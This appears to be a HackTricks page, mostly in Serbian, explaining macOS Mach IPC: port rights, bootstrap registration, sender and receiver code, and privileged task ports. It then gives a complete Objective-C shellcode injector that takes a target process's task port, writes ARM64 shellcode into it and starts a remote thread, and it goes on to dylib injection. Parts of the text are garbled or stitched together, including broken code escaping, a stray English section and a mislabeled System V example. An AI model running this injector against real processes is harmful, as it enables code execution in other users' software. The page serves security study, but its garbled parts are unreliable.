# macOS IPC - Inter Process Communication

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Mach poruke putem Portova

### Osnovne informacije

Mach koristi **taskove** kao **najmanju jedinicu** za deljenje resursa, pri čemu svaki task može sadržati **više niti**. Ovi **taskovi i niti se mapiraju 1:1 na POSIX procese i niti**.

Komunikacija između taskova se odvija putem Mach Inter-Process Communication (IPC), koristeći jednosmjerne komunikacione kanale. **Poruke se prenose između portova**, koji deluju kao **redovi poruka** upravljani od strane kernela.

Svaki proces ima **IPC tabelu**, u kojoj je moguće pronaći **mach portove procesa**. Ime mach porta zapravo predstavlja broj (pokazivač na kernel objekat).

Proces takođe može poslati ime porta sa određenim pravima **drugom tasku** i kernel će napraviti ovaj unos u **IPC tabeli drugog taska**.

### Prava Porta

Prava porta, koja definišu koje operacije task može izvršiti, ključna su za ovu komunikaciju. Moguća **prava porta** su ([definicije odavde](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Pravo za prijem**, koje omogućava prijem poruka poslatih na port. Mach portovi su MPSC (multiple-producer, single-consumer) redovi, što znači da može postojati samo **jedno pravo za prijem za svaki port** u celom sistemu (za razliku od cevi, gde više procesa može držati deskriptore fajlova za kraj za čitanje jedne cevi).
* Task sa **Pravom za prijem** može primiti poruke i **kreirati Prava za slanje**, omogućavajući mu slanje poruka. Originalno samo **sopstveni task ima Pravo za prijem nad svojim portom**.
* **Pravo za slanje**, koje omogućava slanje poruka na port.
* Pravo za slanje se može **klonirati** tako da task koji poseduje Pravo za slanje može klonirati pravo i **dodeliti ga trećem tasku**.
* **Pravo za jednokratno slanje**, koje omogućava slanje jedne poruke na port i zatim nestaje.
* **Pravo za set porta**, koje označava _set portova_ umesto pojedinačnog porta. Izvlačenje poruke iz seta porta izvlači poruku iz jednog od portova koje sadrži. Setovi portova se mogu koristiti za osluškivanje više portova istovremeno, slično kao `select`/`poll`/`epoll`/`kqueue` u Unix-u.
* **Mrtvo ime**, koje nije stvarno pravo porta, već samo rezervisano mesto. Kada se port uništi, sva postojeća prava porta na portu postaju mrtva imena.

**Taskovi mogu preneti SEND prava drugima**, omogućavajući im da pošalju poruke nazad. **SEND prava takođe mogu biti klonirana, tako da task može duplicirati i dati pravo trećem tasku**. Ovo, zajedno sa posredničkim procesom poznatim kao **bootstrap server**, omogućava efikasnu komunikaciju između taskova.

### Portovi Fajlova

Portovi fajlova omogućavaju da se deskriptori fajlova enkapsuliraju u Mac portove (koristeći Mach prava porta). Moguće je kreirati `fileport` iz datog FD koristeći `fileport_makeport` i kreirati FD iz fileporta koristeći `fileport_makefd`.

### Uspostavljanje komunikacije

#### Koraci:

Kako je pomenuto, da bi se uspostavio kanal komunikacije, uključen je **bootstrap server** (**launchd** na Mac-u).

1. Task **A** inicira **novi port**, dobijajući **pravo za prijem** u procesu.
2. Task **A**, kao nosilac Prava za prijem, **generiše Pravo za slanje za port**.
3. Task **A** uspostavlja **konekciju** sa **bootstrap serverom**, pružajući **servisno ime porta** i **Pravo za slanje** kroz proceduru poznatu kao registracija bootstrap-a.
4. Task **B** interaguje sa **bootstrap serverom** da izvrši bootstrap **pretragu za ime servisa**. Ukoliko je uspešno, **server duplira Pravo za slanje** primljeno od Taska A i **prebacuje ga Tasku B**.
5. Nakon što dobije Pravo za slanje, Task **B** je sposoban da **formuliše** poruku i pošalje je **Tasku A**.
6. Za dvosmernu komunikaciju obično task **B** generiše novi port sa **Pravom za prijem** i **Pravom za slanje**, i daje **Pravo za slanje Tasku A** kako bi mogao slati poruke TASKU B (dvosmerna komunikacija).

Bootstrap server **ne može autentifikovati** ime servisa koje tvrdi task. Ovo znači da bi **task** potencijalno mogao **predstavljati bilo koji sistemski task**, kao što je lažno **tvrditi ime autorizacionog servisa** a zatim odobravati svaki zahtev.

Zatim, Apple čuva **imena sistema pruženih servisa** u sigurnim konfiguracionim fajlovima, smeštenim u SIP-zaštićenim direktorijumima: `/System/Library/LaunchDaemons` i `/System/Library/LaunchAgents`. Pored svakog imena servisa, takođe je sačuvana i **povezana binarna datoteka**. Bootstrap server će kreirati i držati **Pravo za prijem za svako od ovih imena servisa**.

Za ove unapred definisane servise, **proces pretrage se malo razlikuje**. Kada se ime servisa traži, launchd pokreće servis dinamički. Novi tok rada je sledeći:

* Task **B** inicira bootstrap **pretragu** za imenom servisa.
* **launchd** proverava da li je task pokrenut i ako nije, ga **pokreće**.
* Task **A** (servis) izvršava **bootstrap check-in**. Ovde, **bootstrap** server kreira Pravo za slanje, zadržava ga, i **prebacuje Pravo za prijem Tasku A**.
* launchd duplira **Pravo za slanje i šalje ga Tasku B**.
* Task **B** generiše novi port sa **Pravom za prijem** i **Pravom za slanje**, i daje **Pravo za slanje Tasku A** (servisu) kako bi mogao slati poruke TASKU B (dvosmerna komunikacija).

Međutim, ovaj proces se odnosi samo na unapred definisane sistemski taskove. Ne-sistemski taskovi i dalje funkcionišu kao što je opisano originalno, što potencijalno može omogućiti predstavljanje.

### Mach Poruka

[Pronađite više informacija ovde](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Funkcija `mach_msg`, suštinski sistemski poziv, koristi se za slanje i primanje Mach poruka. Funkcija zahteva da poruka bude poslata kao početni argument. Ova poruka mora početi sa strukturom `mach_msg_header_t`, praćenom stvarnim sadržajem poruke. Struktura je definisana na sledeći način:

```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```

Procesi koji poseduju _**pravo na prijem**_ mogu primati poruke na Mach portu. Nasuprot tome, **pošiljaoci** imaju _**pravo slanja**_ ili _**pravo slanja jednom**_. Pravo slanja jednom je isključivo za slanje jedne poruke, nakon čega postaje nevažeće.

Da bi postigli jednostavnu **bidirekcionalnu komunikaciju**, proces može odrediti **mach port** u mach **zaglavlju poruke** nazvan _port za odgovor_ (**`msgh_local_port`**) gde **primalac** poruke može **poslati odgovor** na tu poruku. Bitovi u **`msgh_bits`** mogu se koristiti da **pokažu** da bi trebalo izvesti i preneti **pravo slanja jednom** za ovaj port (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).

{% hint style="success" %}
Imajte na umu da se ovakva vrsta bidirekcionalne komunikacije koristi u XPC porukama koje očekuju odgovor (`xpc_connection_send_message_with_reply` i `xpc_connection_send_message_with_reply_sync`). Ali se **obično stvaraju različiti portovi** kako je objašnjeno ranije da bi se uspostavila bidirekcionalna komunikacija.
{% endhint %}

Ostala polja zaglavlja poruke su:

* `msgh_size`: veličina celog paketa.
* `msgh_remote_port`: port na koji je poslata ova poruka.
* `msgh_voucher_port`: [mach vaučeri](https://robert.sesek.com/2023/6/mach\_vouchers.html).
* `msgh_id`: ID ove poruke, koji tumači primalac.

{% hint style="danger" %}
Imajte na umu da se **mach poruke šalju preko \_mach porta**\_, koji je **kanal komunikacije sa jednim primaocem** i **više pošiljalaca** ugrađen u mach jezgro. **Više procesa** može **slati poruke** na mach port, ali u svakom trenutku samo **jedan proces može čitati** sa njega.
{% endhint %}

### Nabrojavanje portova

```bash
lsmp -p <pid>
```

Možete instalirati ovaj alat u iOS preuzimanjem sa [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Primer koda

Obratite pažnju kako **pošiljalac** **dodeljuje** port, kreira **send right** za ime `org.darlinghq.example` i šalje ga **bootstrap serveru** dok je pošiljalac zatražio **send right** za to ime i koristio ga je da **pošalje poruku**.

```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```

Ovo je primer koda za slanje poruka preko IPC-a na macOS operativnom sistemu. Koristi se funkcija `msgsnd` za slanje poruke na red poruka. Potrebno je prvo dobiti identifikator reda poruka koristeći funkciju `msgget`. Zatim se koristi funkcija `msgsnd` za slanje strukture poruke na red poruka. Na kraju, koristi se funkcija `msgctl` za kontrolu reda poruka. Ovaj kod demonstrira osnovni proces slanja poruka preko IPC-a na macOS-u.

```c
#include <stdio.h>
#include <sys/ipc.h>
#include <sys/msg.h>

struct message {
    long mtype;
    char mtext[100];
};

int main() {
    key_t key;
    int msgid;
    struct message msg = {1, "Hello, IPC!"};

    key = ftok("sender.c", 'B');
    msgid = msgget(key, 0666 | IPC_CREAT);

    msgsnd(msgid, &msg, sizeof(struct message), 0);

    msgctl(msgid, IPC_RMID, NULL);

    return 0;
}
```

```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```

### Privilegovani portovi

* **Host port**: Ako proces ima **Send** privilegiju nad ovim portom, može dobiti **informacije** o **sistemu** (npr. `host_processor_info`).
* **Host priv port**: Proces sa **Send** pravom nad ovim portom može izvršiti **privilegovane akcije** poput učitavanja kernel ekstenzija. **Proces mora biti root** da bi dobio ovo ovlašćenje.
* Takođe, da bi pozvao **`kext_request`** API, potrebno je imati druge dozvole poput **`com.apple.private.kext*`** koje su dodeljene samo Apple binarnim fajlovima.
* **Task name port**: Neprivilegovana verzija _task porta_. Referencira task, ali ne dozvoljava kontrolu nad njim. Jedina stvar koja je dostupna kroz njega je `task_info()`.
* **Task port** (poznat i kao kernel port)**:** Sa Send dozvolom nad ovim portom moguće je kontrolisati task (čitanje/pisanje memorije, kreiranje niti...).
* Pozovi `mach_task_self()` da **dobiješ ime** za ovaj port za pozivaoca taska. Ovaj port se nasleđuje samo preko **`exec()`**; novi task kreiran sa `fork()` dobija novi task port (kao poseban slučaj, task takođe dobija novi task port nakon `exec()` u suid binarnom fajlu). Jedini način da spawnuješ task i dobiješ njegov port je da izvedeš ["port swap dance"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) dok radiš `fork()`.
* Ovo su ograničenja za pristup portu (iz `macos_task_policy` iz binarnog fajla `AppleMobileFileIntegrity`):
  * Ako aplikacija ima **`com.apple.security.get-task-allow` dozvolu**, procesi od **istog korisnika mogu pristupiti task portu** (obično dodato od strane Xcode-a za debugovanje). Proces notarizacije neće dozvoliti ovo za produkcijska izdanja.
  * Aplikacije sa **`com.apple.system-task-ports` dozvolom** mogu dobiti **task port za bilo** koji proces, osim kernela. U starijim verzijama se nazivalo **`task_for_pid-allow`**. Ovo je dodeljeno samo Apple aplikacijama.
  * **Root može pristupiti task portovima** aplikacija **koje nisu kompajlirane sa** zaštićenim izvršavanjem (i ne od strane Apple-a).

### Ubacivanje shell koda u nit putem Task porta

Možeš dohvatiti shell kod sa:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```

#### macOS IPC (Inter-Process Communication)

IPC mechanisms are used by macOS applications to communicate with each other. Understanding how IPC works is crucial for privilege escalation and lateral movement during a security assessment.

**Mach Messages**

Mach messages are a low-level IPC mechanism used by macOS. They are sent between tasks and are used for inter-process communication. By analyzing the entitlements.plist file, you can identify which processes are allowed to send and receive Mach messages.

**XPC Services**

XPC services are a higher-level IPC mechanism that allows applications to create and manage separate processes. By analyzing the entitlements.plist file, you can determine which XPC services are available and which processes can communicate with them.

**Distributed Objects**

Distributed Objects is another IPC mechanism used by macOS applications. By analyzing the entitlements.plist file, you can identify which processes are allowed to use Distributed Objects for inter-process communication.

Understanding these IPC mechanisms and analyzing the entitlements.plist file can help identify potential security weaknesses and privilege escalation opportunities in macOS applications.

```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```

**Kompajlujte** prethodni program i dodajte **ovlašćenja** kako biste mogli da ubacite kod sa istim korisnikom (ako ne, moraćete koristiti **sudo**).

<details>

<summary>sc_injector.m</summary>

\`\`\`objectivec // gcc -framework Foundation -framework Appkit sc\_injector.m -o sc\_injector

\#import \<Foundation/Foundation.h> #import \<AppKit/AppKit.h> #include \<mach/mach\_vm.h> #include \<sys/sysctl.h>

\#ifdef **arm64**

kern\_return\_t mach\_vm\_allocate ( vm\_map\_t target, mach\_vm\_address\_t \*address, mach\_vm\_size\_t size, int flags );

kern\_return\_t mach\_vm\_write ( vm\_map\_t target\_task, mach\_vm\_address\_t address, vm\_offset\_t data, mach\_msg\_type\_number\_t dataCnt );

\#else #include \<mach/mach\_vm.h> #endif

\#define STACK\_SIZE 65536 #define CODE\_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala char injectedCode\[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";

int inject(pid\_t pid){

task\_t remoteTask;

// Get access to the task port of the process we want to inject into kern\_return\_t kr = task\_for\_pid(mach\_task\_self(), pid, \&remoteTask); if (kr != KERN\_SUCCESS) { fprintf (stderr, "Unable to call task\_for\_pid on pid %d: %d. Cannot continue!\n",pid, kr); return (-1); } else{ printf("Gathered privileges over the task port of process: %d\n", pid); }

// Allocate memory for the stack mach\_vm\_address\_t remoteStack64 = (vm\_address\_t) NULL; mach\_vm\_address\_t remoteCode64 = (vm\_address\_t) NULL; kr = mach\_vm\_allocate(remoteTask, \&remoteStack64, STACK\_SIZE, VM\_FLAGS\_ANYWHERE);

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach\_error\_string(kr)); return (-2); } else {

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64); }

// Allocate memory for the code remoteCode64 = (vm\_address\_t) NULL; kr = mach\_vm\_allocate( remoteTask, \&remoteCode64, CODE\_SIZE, VM\_FLAGS\_ANYWHERE );

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach\_error\_string(kr)); return (-2); }

// Write the shellcode to the allocated memory kr = mach\_vm\_write(remoteTask, // Task port remoteCode64, // Virtual Address (Destination) (vm\_address\_t) injectedCode, // Source 0xa9); // Length of the source

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach\_error\_string(kr)); return (-3); }

// Set the permissions on the allocated code memory kr = vm\_protect(remoteTask, remoteCode64, 0x70, FALSE, VM\_PROT\_READ | VM\_PROT\_EXECUTE);

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach\_error\_string(kr)); return (-4); }

// Set the permissions on the allocated stack memory kr = vm\_protect(remoteTask, remoteStack64, STACK\_SIZE, TRUE, VM\_PROT\_READ | VM\_PROT\_WRITE);

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach\_error\_string(kr)); return (-4); }

// Create thread to run shellcode struct arm\_unified\_thread\_state remoteThreadState64; thread\_act\_t remoteThread;

memset(\&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK\_SIZE / 2); // this is the real stack //remoteStack64 -= 8; // need alignment of 16

const char\* p = (const char\*) remoteCode64;

remoteThreadState64.ash.flavor = ARM\_THREAD\_STATE64; remoteThreadState64.ash.count = ARM\_THREAD\_STATE64\_COUNT; remoteThreadState64.ts\_64.\_\_pc = (u\_int64\_t) remoteCode64; remoteThreadState64.ts\_64.\_\_sp = (u\_int64\_t) remoteStack64;

printf ("Remote Stack 64 0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread\_create\_running(remoteTask, ARM\_THREAD\_STATE64, // ARM\_THREAD\_STATE64, (thread\_state\_t) \&remoteThreadState64.ts\_64, ARM\_THREAD\_STATE64\_COUNT , \&remoteThread );

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to create remote thread: error %s", mach\_error\_string (kr)); return (-3); }

return (0); }

pid\_t pidForProcessName(NSString \*processName) { NSArray \*arguments = @\[@"pgrep", processName]; NSTask \*task = \[\[NSTask alloc] init]; \[task setLaunchPath:@"/usr/bin/env"]; \[task setArguments:arguments];

NSPipe \*pipe = \[NSPipe pipe]; \[task setStandardOutput:pipe];

NSFileHandle \*file = \[pipe fileHandleForReading];

\[task launch];

NSData \*data = \[file readDataToEndOfFile]; NSString \*string = \[\[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid\_t)\[string integerValue]; }

BOOL isStringNumeric(NSString _str) { NSCharacterSet_ nonNumbers = \[\[NSCharacterSet decimalDigitCharacterSet] invertedSet]; NSRange r = \[str rangeOfCharacterFromSet: nonNumbers]; return r.location == NSNotFound; }

int main(int argc, const char \* argv\[]) { @autoreleasepool { if (argc < 2) { NSLog(@"Usage: %s ", argv\[0]); return 1; }

NSString \*arg = \[NSString stringWithUTF8String:argv\[1]]; pid\_t pid;

if (isStringNumeric(arg)) { pid = \[arg intValue]; } else { pid = pidForProcessName(arg); if (pid == 0) { NSLog(@"Error: Process named '%@' not found.", arg); return 1; } else{ printf("Found PID of process '%s': %d\n", \[arg UTF8String], pid); } }

inject(pid); }

return 0; }

````
</detalji>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
````

#### Ubacivanje Dylib-a u nit putem Task porta

Na macOS-u se **niti** mogu manipulisati putem **Mach** ili korišćenjem **posix `pthread` API-ja**. Nit koju smo generisali u prethodnom ubacivanju, generisana je korišćenjem Mach API-ja, tako da **nije posix kompatibilna**.

Bilo je moguće **ubaciti jednostavan shellcode** da izvrši komandu jer **nije bilo potrebno raditi sa posix** kompatibilnim API-jima, već samo sa Mach-om. **Složenije injekcije** bi zahtevale da **nit** takođe bude **posix kompatibilna**.

Stoga, da bismo **unapredili nit**, trebalo bi da pozovemo **`pthread_create_from_mach_thread`** koji će **kreirati validnu pthread**. Zatim, ova nova pthread bi mogla **pozvati dlopen** da **učita dylib** sa sistema, tako da umesto pisanja novog shellcode-a za obavljanje različitih akcija, moguće je učitati prilagođene biblioteke.

Možete pronaći **primer dylib-ova** u (na primer onaj koji generiše log i zatim možete da ga slušate):

</details>
